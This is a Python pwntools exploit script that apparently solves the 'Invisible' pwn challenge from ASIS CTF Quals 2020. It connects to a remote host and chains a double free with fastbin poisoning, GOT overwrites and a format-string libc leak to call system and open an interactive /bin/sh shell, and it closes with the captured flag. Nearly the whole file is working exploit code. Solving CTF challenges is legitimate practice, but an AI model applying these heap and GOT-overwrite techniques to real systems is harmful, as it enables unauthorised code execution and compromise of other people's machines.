from pwn import *

# context(os='linux', arch='amd64')
# context.log_level = 'debug'

elf = ELF("/home/alessio/Scrivania/tools/CTFs/ASIS CTF Quals 2020/Invisible/chall")
libc = ELF("/home/alessio/Scrivania/tools/CTFs/ASIS CTF Quals 2020/Invisible/libc-2.23.so")
HOST = "69.172.229.147"
PORT = 9003
s = remote(HOST, PORT)


def new(index, size, data):
    s.sendlineafter("> ", "1")
    s.sendlineafter(": ", str(index))
    s.sendlineafter(": ", str(size))
    s.sendafter(": ", data)


def edit(index, size, data):
    s.sendlineafter("> ", "2")
    s.sendlineafter(": ", str(index))
    s.sendlineafter(": ", str(size))
    s.sendafter(": ", data)


def edit1(size, data):
    s.sendlineafter("> ", "22")
    s.sendlineafter(": ", "1")
    s.sendlineafter(": ", size)
    s.sendafter(": ", data)


def edit2(index, size):
    s.sendlineafter("> ", "2")
    s.sendlineafter(": ", str(index))
    s.sendlineafter(": ", str(size))


def delete(index):
    s.sendlineafter("> ", "3")
    s.sendlineafter(": ", str(index))


new(0, 0x60, "A" * 0x10)
new(1, 0x60, "B" * 0x10)

# Double Free
edit2(0, 0)
delete(1)
delete(0)

new(0, 0x60, p64(0x60202d))

# use fastbin 2 times
new(1, 0x60, "C" * 0x10)
edit(1, 0x70, "c")
delete(1)

new(1, 0x60, "D" * 0x10)
edit(1, 0x20, "d")
delete(1)

# GOT overwrite
# printf GOT : LSB is null
# 0x00007ffff7a62800
buf = b"\x7f\x00\x00"
buf += p64(elf.sym['alarm'] + 6)
buf += p64(elf.sym['read'] + 6)
buf += p64(elf.sym['signal'] + 6)
buf += p64(elf.sym['malloc'] + 6)
buf += p64(0x40071e)  # realloc => ret
buf += p64(elf.sym['setvbuf'] + 6)
buf += p64(elf.sym['printf'] + 6)  # atoi => printf
new(1, 0x60, buf)

# libc leak
s.sendlineafter("> ", "1")
s.sendlineafter(": ", "%3$p")

r = s.recvuntil("[")[:-1]
# leak the libc address
libc_leak = int(r, 16)
# leak the base address of libc
libc_base = libc_leak - 0xf7260
# leak the "system" address on the libc
system_addr = libc_base + libc.symbols['system']

log.info("libc_leak --> %s" % hex(libc_leak))
log.info("libc_base --> %s" % hex(libc_base))
log.info("system_addr --> %s" % hex(system_addr))

buf = b"\x7f\x00\x00"
buf += p64(elf.sym['alarm'] + 6)
buf += p64(elf.sym['read'] + 6)
buf += p64(elf.sym['signal'] + 6)
buf += p64(elf.sym['malloc'] + 6)
buf += p64(0x40071e)  # realloc => ret
buf += p64(elf.sym['setvbuf'] + 6)
buf += p64(system_addr)
edit1("%96c", buf)

# start /bin/sh
s.sendlineafter("> ", "/bin/sh\x00")
s.interactive()

# FLAG --> ASIS{l0ngl0ng-tr4v3l-2-s33k-7h3-l34k}
